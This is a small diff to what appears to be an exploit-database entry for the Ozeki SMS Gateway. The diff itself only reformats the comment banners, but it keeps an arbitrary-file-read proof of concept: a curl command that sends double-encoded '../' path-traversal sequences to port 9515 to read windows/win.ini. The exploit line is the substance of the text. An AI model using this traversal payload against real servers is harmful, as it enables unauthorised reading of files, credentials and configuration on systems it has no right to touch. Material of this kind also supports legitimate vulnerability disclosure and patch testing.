@@ -16,10 +16,10 @@ https://ozeki-sms-gateway.com/attachments/702/installwindows_1689352737_OzekiSMS
 
 
 
-##################################### Arbitrary File Read PoC ####################################
+################### Arbitrary File Read PoC ###################
 
 curl https://localhost:9515/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/win.ini
 
-##################################### Arbitrary File Read PoC ####################################
+################### Arbitrary File Read PoC ###################
             
 
